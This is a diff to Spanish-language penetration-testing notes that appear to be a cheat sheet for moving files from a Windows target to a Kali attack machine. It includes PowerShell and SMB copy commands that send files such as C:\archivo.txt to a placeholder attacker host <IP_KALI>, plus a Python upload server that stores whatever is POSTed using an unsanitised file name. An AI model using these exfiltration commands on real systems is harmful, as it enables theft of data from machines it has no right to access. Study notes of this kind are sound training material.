@@ -172,7 +172,7 @@ EXTRA:
 	   ❯ copy file.exe \\<IP_KALI>\smbFolder\
 	   # Montar SMB con credenciales → luego copiar
 
-3. ❯ powershell -c "Invoke-WebRequest -Uri http://<IP_KALI>/upload -Method POST -InFile C:\archivo.txt"
+3. ❯ powershell -c "Invoke-WebRequest -Uri http://<IP_KALI>/archivo.txt -Method POST -InFile C:\archivo.txt"
    # POST upload a servidor HTTP de Kali
 ```
 
@@ -185,8 +185,26 @@ EXTRA:
 2. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
    # SMB con credenciales → Windows 10/11 (bloquea anónimo por defecto)
 
-3. ❯ python3 -m http.server 80
-   # Si Windows hace GET/POST al servidor de Kali
+3. ❯ python3 server.py 
+
+# Crear el archivo 'server.py'
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import os
+
+class UploadHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        body = self.rfile.read(content_length)
+        
+        filename = self.path.strip('/')
+        with open(filename, 'wb') as f:
+            f.write(body)
+        
+        self.send_response(200)
+        self.end_headers()
+        print(f"[+] Archivo recibido: {filename}")
+
+HTTPServer(('0.0.0.0', 8888), UploadHandler).serve_forever()
 ```
 
 ---
